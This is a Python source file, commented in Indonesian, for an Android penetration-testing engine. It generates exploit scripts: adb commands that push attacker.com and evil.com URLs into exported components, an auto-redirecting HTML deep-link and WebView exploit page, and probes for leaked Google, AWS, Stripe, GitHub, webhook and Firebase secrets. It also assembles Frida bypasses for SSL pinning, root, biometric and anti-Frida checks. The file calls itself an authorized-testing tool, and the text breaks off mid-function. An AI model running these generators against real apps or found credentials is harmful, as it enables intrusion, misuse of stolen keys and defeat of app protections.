import os
import re
import json
import urllib.parse
from pathlib import Path
from typing import Dict, Any, List, Optional

class PoCEngine:
    """
    Engine untuk men-generate PoC & Exploit Scripts otomatis:
    - Opsi A: Ekstraksi parameter Intent (getStringExtra, getIntExtra, dll) & DeepLink Query Params
    - Opsi B: Generator Frida Bypass Script (Root, SSL Pinning, Biometric, Crypto Dumper)
    - Opsi C: HTML Exploit Builder (WebView XSS, DeepLink Launcher, Intent URL)
    - Opsi D: Python Auto-Verifier + Logcat Assertion
    - Opsi E: Skeleton AI Assistant Connector
    """

    def __init__(self, corpus_dir: Optional[Path] = None):
        self.corpus_dir = corpus_dir
        # index corpus: dibangun SEKALI (bukan rglob per komponen) — fix quadratic
        self._corpus_java: Optional[List[Path]] = None
        self._corpus_smali: Optional[List[Path]] = None

    def _java_index(self) -> List[Path]:
        if self._corpus_java is None:
            try:
                self._corpus_java = (list(self.corpus_dir.rglob("*.java"))
                                     if self.corpus_dir and self.corpus_dir.exists() else [])
            except OSError:
                self._corpus_java = []
        return self._corpus_java

    def _smali_index(self) -> List[Path]:
        if self._corpus_smali is None:
            try:
                self._corpus_smali = (list(self.corpus_dir.rglob("*.smali"))
                                     if self.corpus_dir and self.corpus_dir.exists() else [])
            except OSError:
                self._corpus_smali = []
        return self._corpus_smali

    def extract_intent_extras_from_file(self, file_path: Path) -> List[Dict[str, Any]]:
        """Mengekstrak ekstra intent (String, Int, Boolean, Uri query) dari file Java atau Smali."""
        if not file_path.exists() or not file_path.is_file():
            return []
        
        try:
            content = file_path.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            return []

        extras = []
        seen = set()

        # 1. String Extras: getStringExtra("key")
        for m in re.finditer(r'(?:getStringExtra|getString)\s*\(\s*["\']([^"\']+)["\']\s*\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "string",
                    "key": key,
                    "sample_value": "https://evil.com/xss_payload",
                    "adb_flag": f'--es "{key}" "https://evil.com/xss_payload"'
                })

        # 2. Boolean Extras: getBooleanExtra("key", ...)
        for m in re.finditer(r'getBooleanExtra\s*\(\s*["\']([^"\']+)["\']\s*,\s*[^)]+\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "boolean",
                    "key": key,
                    "sample_value": "true",
                    "adb_flag": f'--ez "{key}" true'
                })

        # 3. Integer / Long Extras: getIntExtra("key", ...) / getLongExtra("key", ...)
        for m in re.finditer(r'(?:getIntExtra|getLongExtra)\s*\(\s*["\']([^"\']+)["\']\s*,\s*[^)]+\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "int",
                    "key": key,
                    "sample_value": "1337",
                    "adb_flag": f'--ei "{key}" 1337'
                })

        # 4. URI Query Parameters: getQueryParameter("param")
        for m in re.finditer(r'getQueryParameter\s*\(\s*["\']([^"\']+)["\']\s*\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "query_param",
                    "key": key,
                    "sample_value": "https://attacker.com/callback",
                    "uri_part": f'{key}=https://attacker.com/callback'
                })

        # 5. Smali Patterns: const-string vX, "key" -> invoke-virtual {vY, vX}, Landroid/content/Intent;->getStringExtra
        for m in re.finditer(r'const-string\s+[vp]\d+,\s*["\']([^"\']+)["\']\s*\n\s*invoke-virtual\s*\{[^}]+\},\s*Landroid/content/Intent;->get(?:String|Boolean|Int)Extra', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "string",
                    "key": key,
                    "sample_value": "EXPLOIT_PARAM",
                    "adb_flag": f'--es "{key}" "EXPLOIT_PARAM"'
                })

        return extras

    def find_component_source_files(self, component_name: str) -> List[Path]:
        """Mencari file .java atau .smali yang sesuai dengan nama class komponen.

        Pakai index corpus yang dibangun sekali (satu walk) lalu cocokkan di
        memori — bukan rglob seluruh corpus per komponen (dulu kuadratik:
        N komponen x N file = menit untuk corpus besar).
        """
        rel_path_part = component_name.replace(".", "/")
        simple_name = component_name.split(".")[-1]

        def _match(files: List[Path]) -> List[Path]:
            out = []
            for p in files:
                s = str(p)
                if rel_path_part in s.replace("\\", "/") or simple_name in p.name:
                    out.append(p)
                    if len(out) >= 3:
                        break
            return out

        matches = _match(self._java_index())
        if not matches:
            matches = _match(self._smali_index())
        return matches

    def generate_component_poc(self, package_name: str, component: Dict[str, Any]) -> Dict[str, Any]:
        """Menghasilkan PoC terinci untuk komponen yang diekspor dengan ekstraksi parameter asli."""
        comp_name = component.get("name", "")
        comp_type = (component.get("type") or "activity").lower()
        exported = component.get("exported") in (True, "true", "True")
        authority = component.get("authority", "")

        # Ekstraksi parameter asli dari kode jika corpus tersedia
        extracted_extras = []
        if comp_name:
            source_files = self.find_component_source_files(comp_name)
            for sf in source_files:
                extras = self.extract_intent_extras_from_file(sf)
                if extras:
                    extracted_extras.extend(extras)
                    break

        # Susun ADB flags dari extracted parameters
        extra_flags = " ".join([e["adb_flag"] for e in extracted_extras if "adb_flag" in e])
        if not extra_flags:
            # Fallback jika tidak terdeteksi extras khusus
            if comp_type == "activity":
                extra_flags = '--es "url" "https://evil.com" --ez "is_admin" true'
            else:
                extra_flags = '--es "data" "probe_payload"'

        full_target = f"{package_name}/{comp_name}" if not comp_name.startswith(package_name) else comp_name
        if "/" not in full_target:
            full_target = f"{package_name}/{comp_name}"

        # 1. Shell Script PoC
        if comp_type == "activity":
            adb_cmd = f'adb shell am start -n {full_target} {extra_flags}'.strip()
            desc = "Launch Unprotected Exported Activity with Extracted Intent Extras"
        elif comp_type == "service":
            adb_cmd = f'adb shell am startservice -n {full_target} {extra_flags}'.strip()
            desc = "Trigger Exported Background Service directly"
        elif comp_type == "receiver":
            adb_cmd = f'adb shell am broadcast -n {full_target} {extra_flags}'.strip()
            desc = "Send Spoofed Broadcast to Exported Receiver"
        elif comp_type == "provider":
            auth_val = authority or f"{package_name}.provider"
            adb_cmd = f'adb shell content query --uri content://{auth_val}/'
            desc = "Query Exported Content Provider directly"
        else:
            adb_cmd = f'adb shell am start -n {full_target} {extra_flags}'.strip()
            desc = "Direct Component Invocation"

        bash_script = f"""#!/bin/bash
# ==============================================================================
# Exploit PoC for Exported {comp_type.upper()}: {comp_name.split('.')[-1]}
# Target Package: {package_name}
# Description: {desc}
# ==============================================================================

echo "[*] Sending payload to target component..."
{adb_cmd}

echo "[+] Done. Check device screen or logcat."
"""

        # 2. Python Auto-Verifier PoC dengan Logcat Watcher (Opsi D)
        python_script = f"""#!/usr/bin/env python3
# ==============================================================================
# Automated Verification Script with Logcat Assertion
# Target: {package_name} ({comp_name})
# ==============================================================================
import subprocess
import time
import sys

PACKAGE = "{package_name}"
COMPONENT = "{full_target}"

print(f"[*] Starting logcat listener for {{PACKAGE}}...")
# Clear logcat first
subprocess.run(["adb", "logcat", "-c"], check=False)

print(f"[*] Executing exploit command...")
cmd = {json.dumps(adb_cmd.split())}
proc = subprocess.run(cmd, capture_output=True, text=True)
print(f"[>] Command output: {{proc.stdout.strip()}}")

time.sleep(1.5)

print(f"[*] Checking logcat for exceptions or successful trigger...")
log_proc = subprocess.run(["adb", "logcat", "-d", "-s", "AndroidRuntime:E", f"{{PACKAGE}}:V"], capture_output=True, text=True)
logs = log_proc.stdout

if "FATAL EXCEPTION" in logs or "Crash" in logs:
    print("[!] ALERT: Application crashed / NullPointer triggered via intent manipulation!")
elif proc.returncode == 0:
    print("[+] SUCCESS: Intent delivered successfully without permission denial.")
else:
    print(f"[-] Execution failed: {{proc.stderr}}")
"""

        return {
            "component_name": comp_name,
            "component_type": comp_type,
            "exported": exported,
            "extracted_extras": extracted_extras,
            "adb_command": adb_cmd,
            "bash_poc": bash_script,
            "python_poc": python_script
        }

    def generate_deeplink_poc(self, package_name: str, deeplink_str: str) -> Dict[str, Any]:
        """Menghasilkan PoC lengkap untuk skema Deep Link & WebView Launcher (Opsi C & D)."""
        scheme_url = deeplink_str.strip()
        if "://" not in scheme_url:
            scheme_url = f"{scheme_url}://open?url=https://attacker.com/xss"

        # Coba parse query string atau tambahkan parameter redirect uji coba
        parsed = urllib.parse.urlparse(scheme_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        test_url = scheme_url
        if not parsed.query:
            test_url = f"{scheme_url}?url=https://attacker.com/poc_redirect&target=https://attacker.com/evil"

        adb_cmd = f'adb shell am start -a android.intent.action.VIEW -d "{test_url}"'

        bash_script = f"""#!/bin/bash
# ==============================================================================
# Exploit PoC for DeepLink Intent Scheme: {deeplink_str}
# Target Package: {package_name}
# ==============================================================================

echo "[*] Triggering DeepLink intent onView..."
{adb_cmd}
"""

        # HTML Exploit Launcher (Opsi C)
        html_exploit = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DeepLink & WebView Hijacking PoC - {package_name}</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; padding: 40px; }}
        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 24px; max-width: 700px; margin: 0 auto; }}
        h1 {{ color: #38bdf8; font-size: 20px; }}
        a.button {{ display: inline-block; background: #3b82f6; color: white; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 16px; }}
        code {{ background: #0f172a; padding: 4px 8px; border-radius: 4px; color: #a3e635; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="card">
        <h1>🎯 DeepLink Redirection / XSS Exploit PoC</h1>
        <p>Target App: <code>{package_name}</code></p>
        <p>Target DeepLink URL Scheme:</p>
        <p><code>{test_url}</code></p>
        <hr style="border-color:#334155; margin: 20px 0;">
        <p>Klik tombol di bawah jika aplikasi tidak terbuka secara otomatis:</p>
        <a href="{test_url}" class="button">🚀 Trigger DeepLink Exploit</a>
    </div>

    <!-- Automatic Redirection Trigger -->
    <script>
        setTimeout(function() {{
            window.location.href = "{test_url}";
        }}, 800);
    </script>
</body>
</html>
"""

        # Python Assertion PoC
        python_poc = f"""#!/usr/bin/env python3
import subprocess
import time

DEEPLINK = "{test_url}"
print(f"[*] Triggering DeepLink: {{DEEPLINK}}")
subprocess.run(["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW", "-d", DEEPLINK])
"""

        return {
            "deeplink": deeplink_str,
            "test_url": test_url,
            "adb_command": adb_cmd,
            "bash_poc": bash_script,
            "html_poc": html_exploit,
            "python_poc": python_poc
        }

    # ------------------------------------------------------------------
    # TIER 1: SECRET PoC — script siap jalan per temuan Secrets & Keys
    # Deterministic template (bukan AI): per tipe kredensial, satu PoC siap
    # eksekusi dengan mode PASIF (read-only) / AKTIF (menulis/mengirim) /
    # TEMPLATE (butuh identifikasi endpoint dari corpus).
    # ------------------------------------------------------------------

    # (rule_id / pola match, poc_type, mode)
    _SECRET_POC_CAP = 30

    @staticmethod
    def _secret_kind(rule_id: str, match: str) -> str:
        """Klasifikasi tipe kredensial -> kunci dispatcher PoC."""
        rid = (rule_id or "").lower()
        m = (match or "").strip()
        if ".firebaseio.com" in m or "firebaseio.com" in m:
            return "firebase_url"
        if rid in ("aws_key",) or m.startswith("AKIA"):
            return "aws"
        if m.startswith("sk_live") or m.startswith("sk_test") or m.startswith("rk_live") or m.startswith("rk_test"):
            return "stripe"
        if "hooks.slack.com/services/" in m:
            return "slack_webhook"
        if "discord.com/api/webhooks/" in m or "discordapp.com/api/webhooks/" in m:
            return "discord_webhook"
        if m.startswith("ghp_") or m.startswith("gho_") or m.startswith("ghu_") or m.startswith("ghs_") or m.startswith("ghr_"):
            return "github_token"
        if m.startswith("SG."):
            return "sendgrid"
        if m.startswith("SK") and len(m) == 34:
            return "twilio"
        if m.startswith("eyJ"):
            return "jwt"
        if "-----BEGIN" in m and "PRIVATE KEY-----" in m:
            return "private_key"
        if m.startswith("AIzaSy") or "gcp_api_key" in rid or "firebase_api_key" in rid:
            return "google_api_key"
        if "googleusercontent.com" in m or "oauth_client" in rid:
            return "oauth_client_id"
        if rid in ("aes_key_hex_32", "aes_iv_hex", "hardcoded_crypto_key", "salt_hardcoded"):
            return "crypto_material"
        if rid in ("login_credential_pair", "hardcoded_password", "hardcoded_secret",
                   "hardcoded_api_key_var", "base64_creds_like", "hardcoded_password"):
            return "generic_credential"
        return ""

    def generate_secret_poc(self, secret: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Rakit satu PoC siap jalan untuk satu temuan secret. None jika tipe tidak dikenal."""
        match = str(secret.get("match") or "").strip()
        rule_id = str(secret.get("rule_id") or "")
        kind = self._secret_kind(rule_id, match)
        if not kind or not match:
            return None

        builder = getattr(self, "_secret_poc_" + kind, None)
        if not builder:
            return None
        poc = builder(match, secret)
        if not poc:
            return None
        poc.update({
            "poc_type": kind,
            "rule_id": rule_id,
            "severity": str(secret.get("severity") or "-"),
            "file_path": str(secret.get("file_path") or "-"),
            "line_number": secret.get("line_number"),
            "match": match[:200],
        })
        return poc

    def generate_secret_pocs(self, secrets: List[Dict[str, Any]],
                             cap: int = None) -> List[Dict[str, Any]]:
        """Generate PoC untuk semua temuan (dedupe per nilai, cap total)."""
        cap = cap or self._SECRET_POC_CAP
        out, seen = [], set()
        for sec in secrets or []:
            if len(out) >= cap:
                break
            sev = str((sec or {}).get("severity") or "").lower()
            if sev not in ("critical", "high", "medium"):
                continue
            key = (str(sec.get("rule_id") or ""), str(sec.get("match") or "")[:200])
            if key in seen:
                continue
            seen.add(key)
            poc = self.generate_secret_poc(dict(sec))
            if poc:
                out.append(poc)
        return out

    # ---- template per tipe (deterministic, placeholder __KEY__/__URL__) ----

    def _secret_poc_google_api_key(self, match, secret):
        code = """#!/usr/bin/env python3
# PoC: Google API Key scope check (PASIF — GET read-only, tidak menulis/membuat resource)
# Key: __KEY__
# Jalankan: python3 poc_google_key.py
import json, urllib.request, urllib.parse

KEY = "__KEY__"

PROBES = [
    ("Generative Language (Gemini)", "https://generativelanguage.googleapis.com/v1beta/models?key="),
    ("Maps Geocoding", "https://maps.googleapis.com/maps/api/geocode/json?address=jakarta&key="),
    ("Drive About", "https://www.googleapis.com/drive/v3/about?fields=user&key="),
    ("YouTube Data v3", "https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&maxResults=1&key="),
    ("Firebase Identity Toolkit", "https://identitytoolkit.googleapis.com/v1/projects?key="),
]

for name, base in PROBES:
    url = base + urllib.parse.quote(KEY, safe="")
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read(400).decode("utf-8", "replace")
            print(f"[!] {name}: HTTP {r.status} (KEY AKTIF di scope ini!) -> {body[:200]}")
    except urllib.error.HTTPError as e:
        detail = e.read(200).decode("utf-8", "replace") if e.fp else ""
        print(f"[-] {name}: HTTP {e.code} {detail[:150]}")
    except Exception as e:
        print(f"[-] {name}: {e}")

print("\nInterpretasi: 200 = key valid utk scope tsb; 403 'not activated/restricted' = aman/limited;")
print("400/403 'API key not valid' = key sudah mati/rotasi.")
"""
        return {
            "title": "Google API Key — Scope Probe",
            "language": "python",
            "mode": "PASIF",
            "description": "Probe 5 scope Google (Gemini, Maps, Drive, YouTube, Identity Toolkit) secara read-only. Bandingkan hasil dengan Live Verifier.",
            "code": code.replace("__KEY__", match),
        }

    def _secret_poc_firebase_url(self, match, secret):
        url = match if match.startswith("http") else "https://" + match
        code = f"""# PoC: Firebase Realtime DB open-rules check (PASIF: read .json; AKTIF: write test jangan lakukan tanpa izin)
# URL: {url}
# 1) READ TEST (aman):
curl -s "{url.rstrip('/')}/.json" -o firebase_read.json -w "HTTP %{{http_code}}\n"
head -c 300 firebase_read.json; echo

# 2) Jika read 200 (rules terbuka), catat isi -> itu temuan P1/P2.
# 3) WRITE TEST (AKTIF - hanya dgn izin tertulis!):
# curl -s -X PUT "{url.rstrip('/')}/.json" -d '{{"poc":"readwrite-probe"}}'
"""
        return {
            "title": "Firebase Realtime DB — Open Rules Check",
            "language": "bash",
            "mode": "PASIF",
            "description": "Cek rules Firebase Realtime DB. Read test aman; write test HANYA dengan izin scope.",
            "code": code,
        }

    def _secret_poc_aws(self, match, secret):
        code = f"""# PoC: AWS Access Key validation (PASIF: STS GetCallerIdentity - read-only)
# Access Key ID: {match}
# Catatan: butuh Secret Access Key (cari di corpus: string 40-char base64-like
# dekat temuan ini). Jika hanya Access Key ID tanpa secret, key tidak bisa dipakai sendiri.

export AWS_ACCESS_KEY_ID="{match}"
export AWS_SECRET_ACCESS_KEY="<ISI_SECRET_ACCESS_KEY_DARI_CORPUS>"
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
# 200 -> akun + role aktif (temuan KRITIS). 403 -> invalid/expired/locked down.
"""
        return {
            "title": "AWS Access Key — STS GetCallerIdentity",
            "language": "bash",
            "mode": "PASIF",
            "description": "Validasi key via STS (read-only). Butuh secret access key — cari di corpus dekat temuan.",
            "code": code,
        }

    def _secret_poc_stripe(self, match, secret):
        code = f"""# PoC: Stripe API key check (PASIF: GET /v1/balance - read-only)
curl -s -u "{match}:" https://api.stripe.com/v1/balance -w "\nHTTP %{{http_code}}\n"
# 200 = LIVE KEY AKTIF (kritis - bisa baca balance/transaksi)
# 401 = key invalid/revoked
"""
        return {
            "title": "Stripe API Key — Balance Probe",
            "language": "bash",
            "mode": "PASIF",
            "description": "GET /v1/balance read-only. sk_live aktif = kritis; sk_test hanya flag hygiene.",
            "code": code,
        }

    def _secret_poc_slack_webhook(self, match, secret):
        code = f"""# PoC: Slack Webhook (AKTIF - mengirim 1 pesan ke channel)
curl -s -X POST -H "Content-type: application/json" \
  --data '{{"text":"[PoC] webhook dari MOPETOT - authorized test"}}' \
  "{match}" -w "\nHTTP %{{http_code}}\n"
# 200 = webhook aktif (bisa posting ke channel klien). Hapus pesan setelah testing.
"""
        return {
            "title": "Slack Webhook — Send Probe",
            "language": "bash",
            "mode": "AKTIF",
            "description": "Webhook aktif = siapa pun bisa posting ke channel. AKTIF: mengirim 1 pesan — hanya dengan izin.",
            "code": code,
        }

    def _secret_poc_discord_webhook(self, match, secret):
        code = f"""# PoC: Discord Webhook (PASIF: GET info webhook; AKTIF: kirim pesan)
# 1) PASIF - info webhook:
curl -s "{match}" -w "\nHTTP %{{http_code}}\n"

# 2) AKTIF - kirim 1 pesan (hanya dengan izin):
curl -s -X POST -H "Content-type: application/json" \
  --data '{{"content":"[PoC] webhook dari MOPETOT - authorized test"}}' \
  "{match}" -w "\nHTTP %{{http_code}}\n"
"""
        return {
            "title": "Discord Webhook — Info & Send Probe",
            "language": "bash",
            "mode": "PASIF",
            "description": "GET webhook info dulu (aman), lalu opsional kirim pesan (AKTIF, perlu izin).",
            "code": code,
        }

    def _secret_poc_github_token(self, match, secret):
        code = f"""# PoC: GitHub Token check (PASIF: GET /user - read-only)
curl -s -H "Authorization: Bearer {match}" https://api.github.com/user -w "\nHTTP %{{http_code}}\n"
# 200 = token aktif - perhatikan "plan", "scope" (repo? org? admin:org = kritis)
# Scope repo + org = akses source code private klien (blast radius besar)
"""
        return {
            "title": "GitHub Token — User Probe",
            "language": "bash",
            "mode": "PASIF",
            "description": "Validasi token + identifikasi scope (repo/org = akses code private).",
            "code": code,
        }

    def _secret_poc_sendgrid(self, match, secret):
        code = f"""# PoC: SendGrid API key check (PASIF: GET /v3/scopes - read-only)
curl -s -H "Authorization: Bearer {match}" https://api.sendgrid.com/v3/scopes -w "\nHTTP %{{http_code}}\n"
# 200 = key aktif. Scope mail.send = bisa kirim email atas nama domain klien (spoofing).
"""
        return {
            "title": "SendGrid Key — Scope Probe",
            "language": "bash",
            "mode": "PASIF",
            "description": "Enumerate scope key read-only. mail.send = spoofing atas nama domain klien.",
            "code": code,
        }

    def _secret_poc_twilio(self, match, secret):
        code = f"""# PoC: Twilio API Key check (PASIF: GET Accounts - read-only, basic auth)
# Twilio API Key format SK.., butuh API Secret (cari di corpus). Alternative:
# jika temuan berbentuk AC.. (Account SID) + auth token, pakai itu:
curl -s -u "ACCOUNT_SID:AUTHTOKEN" https://api.twilio.com/2010-04-01/Accounts.json -w "\nHTTP %{{http_code}}\n"
# Key: {match}
"""
        return {
            "title": "Twilio Key — Account Probe",
            "language": "bash",
            "mode": "PASIF",
            "description": "Validasi kredensial Twilio read-only. SMS send capability = spoofing OTP.",
            "code": code,
        }

    def _secret_poc_jwt(self, match, secret):
        code = """#!/usr/bin/env python3
# PoC: JWT decode & analysis (PASIF - decode lokal, tanpa network)
# Token: __TOKEN__
import base64, json, time

TOKEN = "__TOKEN__"

def b64pad(s):
    return s + "=" * (-len(s) % 4)

try:
    h, p, *rest = TOKEN.split(".")
    header = json.loads(base64.urlsafe_b64decode(b64pad(h)))
    payload = json.loads(base64.urlsafe_b64decode(b64pad(p)))
    print("[*] Header :", json.dumps(header))
    print("[*] Payload:", json.dumps(payload))
    alg = header.get("alg", "?")
    print(f"[*] Alg: {alg}" + ("  <- 'none' = acceptalg tidak aman!" if alg == "none" else ""))
    exp = payload.get("exp")
    if exp:
        status = "EXPIRED" if exp < time.time() else "MASIH BERLAKU"
        print(f"[*] exp: {exp} ({time.strftime('%Y-%m-%d %H:%M', time.localtime(exp))}) -> {status}")
    if not payload.get("exp"):
        print("[!] Tanpa 'exp' - token tidak expire (kritis bila signature lemah)")
    if payload.get("sub") or payload.get("user_id"):
        print(f"[*] Subject: {payload.get('sub') or payload.get('user_id')}")
    print(f"[*] Signature part: {rest[0][:40] if rest else 'TIDAK ADA (alg=none?)'}")
except Exception as e:
    print("[-] Decode gagal:", e)
"""
        return {
            "title": "JWT — Decode & Analysis",
            "language": "python",
            "mode": "PASIF",
            "description": "Decode header/payload lokal: alg, expiry, subject, keberadaan signature.",
            "code": code.replace("__TOKEN__", match),
        }

    def _secret_poc_private_key(self, match, secret):
        code = f"""# PoC: Private Key analysis (PASIF - analisis lokal)
# Simpan ke file (perhatikan trailing newline):
cat > poc_key.pem << 'PEMEOF'
{match}
PEMEOF

# 1) Validitas key:
openssl pkey -in poc_key.pem -check -noout && echo "[!] KEY VALID"

# 2) Tipe & modulus:
openssl pkey -in poc_key.pem -noout -text | head -5

# 3) Public key (untuk dicocokkan dgn cert di corpus/server):
openssl pkey -in poc_key.pem -pubout -outform DER | sha256sum
# Cocokkan hash publik dgn certificate yang dipakai app/server -> pembuktian pemakaian.

# HAPUS file setelah testing: rm poc_key.pem
"""
        return {
            "title": "Private Key — Validity & Match Analysis",
            "language": "bash",
            "mode": "PASIF",
            "description": "Validasi key openssl (lokal), ekstrak fingerprint public key untuk dicocokkan dengan cert di corpus.",
            "code": code,
        }

    def _secret_poc_oauth_client_id(self, match, secret):
        code = f"""# PoC: OAuth Client ID (informasional - client ID public-by-design)
# Client ID: {match}
# Client ID saja bukan vulnerability — kombinasi yang berbahaya:
#   1) cek .well-known/openid-configuration provider untuk redirect_uri policy
#   2) jika ada client_secret terpisah di corpus -> itu temuan utama
#   3) cek apakah app pakai PKCE; tanpa PKCE + redirect lemah = OAuth hijack
curl -s "https://accounts.google.com/.well-known/openid-configuration" | head -c 300
"""
        return {
            "title": "OAuth Client ID — Context Check",
            "language": "bash",
            "mode": "PASIF",
            "description": "Client ID public-by-design — PoC untuk memeriksa kombinasi (secret, PKCE, redirect policy).",
            "code": code,
        }

    def _secret_poc_crypto_material(self, match, secret):
        code = """#!/usr/bin/env python3
# PoC: Crypto material analysis (PASIF - analisis lokal)
# Nilai: __VALUE__
# Rule: __RULE__
import binascii, math, collections

VALUE = "__VALUE__"
hexval = VALUE.replace("0x", "").replace(" ", "")

print("[*] Nilai  :", VALUE)
print("[*] Panjang :", len(hexval), "hex chars =", len(hexval) * 4, "bit")

try:
    raw = binascii.unhexlify(hexval if len(hexval) % 2 == 0 else hexval[:-1])
    print("[*] Bytes  :", len(raw))
    # entropy shannon
    counts = collections.Counter(raw)
    ent = -sum((c / len(raw)) * math.log2(c / len(raw)) for c in counts.values())
    print(f"[*] Entropy: {ent:.2f} bit/byte (8.0 = random sempurna; <4 = kemungkinan bukan key asli)")

    # Jika ini AES key + ada ciphertext (dari traffic/corpus), decrypt attempt:
    # pip install pycryptodome
    try:
        from Crypto.Cipher import AES
        ciphertext = binascii.unhexlify("<ISI_CIPHERTEXT_HEX>")  # dari intercept/pcap
        for mode, mk in (("ECB", lambda: AES.new(raw, AES.MODE_ECB)),
                         ("CBC-IV0", lambda: AES.new(raw, AES.MODE_CBC, iv=b"\x00" * 16)),
                         ("CTR-IV0", lambda: AES.new(raw, AES.MODE_CTR, nonce=b"\x00" * 8))):
            try:
                pt = mk().decrypt(ciphertext[:64])
                printable = sum(32 <= b < 127 for b in pt) / max(1, len(pt))
                print(f"[*] {mode}: printable={printable:.0%} -> {pt[:48]!r}")
            except Exception:
                pass
    except ImportError:
        print("[*] pycryptodome tidak ada - skip decrypt attempt")
except Exception as e:
    print("[-] Bukan hex valid:", e)
"""
        return {
            "title": "Crypto Material — Entropy & Decrypt Attempt",
            "language": "python",
            "mode": "PASIF",
            "description": "Analisis lokal: entropy (key asli vs dummy), lalu attempt decrypt AES (ECB/CBC/CTR) jika ada ciphertext.",
            "code": code.replace("__VALUE__", match).replace("__RULE__", str(secret.get("rule_id") or "-")),
        }

    def _secret_poc_generic_credential(self, match, secret):
        code = """#!/usr/bin/env python3
# PoC TEMPLATE: kredensial generik (butuh identifikasi endpoint dari corpus)
# Rule      : __RULE__
# Nilai     : __VALUE__
# Catatan   : isi TARGET/METHOD/BODY dari hasil explorasi corpus
#            (Code Explorer: grep nama variable/username di sources_java)
import urllib.request, urllib.error, base64

CRED = "__VALUE__"
# Opsi A - Bearer header (API key/mobile API umumnya begini):
# TARGET = "https://<endpoint-dari-corpus>/api/v1/profile"
# req = urllib.request.Request(TARGET, headers={"Authorization": "Bearer " + CRED})

# Opsi B - Basic auth (login_credential_pair / password):
user, pwd = "<USERNAME>", CRED
basic = base64.b64encode(f"{user}:{pwd}".encode()).decode()
req = urllib.request.Request("https://<ENDPOINT_LOGIN>/login",
                             headers={"Authorization": "Basic " + basic})
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        print("[!] HTTP", r.status, r.read(300))
except urllib.error.HTTPError as e:
    print("[-] HTTP", e.code, e.read(200)[:200])
except Exception as e:
    print("[-]", e)
"""
        return {
            "title": "Generic Credential — Request Scaffold",
            "language": "python",
            "mode": "TEMPLATE",
            "description": ("Scaffold login/API test. Identifikasi endpoint via Code Explorer "
                            "(grep nama variable di corpus), lalu jalankan lewat Live Verifier "
                            "-> Credential Login Tester (uji non-destruktif otomatis), atau isi TARGET di script ini. "
                            "Lanjut reasoning pakai chat agent jika bingung."),
            "code": code.replace("__VALUE__", match).replace("__RULE__", str(secret.get("rule_id") or "-")),
        }

    # ------------------------------------------------------------------
    # RASP-AWARE FRIDA BYPASS GENERATOR
    # Baca hasil deteksi RASP (meta["rasp"] dari findings.json) lalu rakit
    # script sesuai musuh: anti-frida-detection native, hook per-RASP SDK,
    # bypass standar (SSL pinning / root / biometric / crypto).
    # ------------------------------------------------------------------

    @staticmethod
    def _analyze_rasp_profile(rasp_info: str, frameworks, findings) -> dict:
        rl = (rasp_info or "").lower()
        # label scanner diawali "TERDETEKSI" / "SEBAGIAN" / "TIDAK TERDETEKSI"
        # — pakai startswith agar "tidak terdeteksi" tidak dianggap proteksi
        protected = rl.startswith("terdeteksi") or rl.startswith("sebagian")
        fw = [str(f).lower() for f in (frameworks or [])]
        cats = [str((f or {}).get("category") or "").lower() for f in (findings or [])]
        # protektor komersial/packer: dari label kategori ATAU nama SDK yang dikenal
        commercial_marks = [
            "appsealing", "promon", "dexguard", "appguard", "bangcle", "secneo",
            "jiagu", "legu", "v-guard", "vguard", "appdome", "whitecryption",
            "free_rasp", "integrity", "baidu protect", "alibaba security",
        ]
        return {
            "rasp_label": rasp_info or "TIDAK TERDETEKSI (tidak ada indikasi runtime protection)",
            "commercial": (rl.startswith("terdeteksi") and (("komersial" in rl) or ("packer" in rl)))
                           or any(m in rl for m in commercial_marks),
            "rootbeer": "rootbeer" in rl,
            "anti_debug": "anti-debug" in rl,
            "anti_vm": "anti-vm" in rl,
            # ada proteksi apa pun (komersial/packer/lib/in-app) -> sembunyikan frida
            "anti_frida": protected,
            "flutter": "flutter" in fw,
            "crypto": any("crypto" in c or "key" in c or "credentials" in c for c in cats),
        }

    def generate_frida_bypass_script(self, package_name: str,
                                     findings: List[Dict[str, Any]] = None,
                                     rasp_info: str = "",
                                     frameworks: List[str] = None) -> str:
        """Generate RASP-aware Frida bypass script dari hasil scan.

        Urutan blok disesuaikan proteksi yang terdeteksi:
        [0] anti-frida-detection (native libc)  -> jalan duluan (blinding)
        [1] exit-guard utk RASP kill-switch      -> RASP komersial/packer
        [2] hook per-RASP SDK (RootBeer, dst.)
        [3] anti-debug / anti-VM
        [4] bypass standar: SSL pinning, root, biometric
        [5] crypto dumper (jika temuan crypto/kredensial)
        """
        findings = findings or []
        prof = self._analyze_rasp_profile(rasp_info, frameworks, findings)

        blocks_native = []
        if prof["anti_frida"]:
            blocks_native.append(_JS_ANTI_FRIDA_NATIVE)
        if prof["anti_debug"]:
            blocks_native.append(_JS_ANTI_DEBUG_NATIVE)

        blocks_java = []
        if prof["commercial"]:
            blocks_java.append(_JS_RASP_EXIT_GUARD)
        if prof["rootbeer"]:
            blocks_java.append(_JS_ROOTBEER)
        if prof["anti_vm"]:
            blocks_java.append(_JS_ANTI_VM)
        blocks_java.append(_JS_SSL_PINNING)
        blocks_java.append(_JS_ROOT)
        blocks_java.append(_JS_BIOMETRIC)
        if prof["crypto"]:
            blocks_java.append(_JS_CRYPTO)
        if prof["flutter"]:
            blocks_java.append(_JS_FLUTTER)

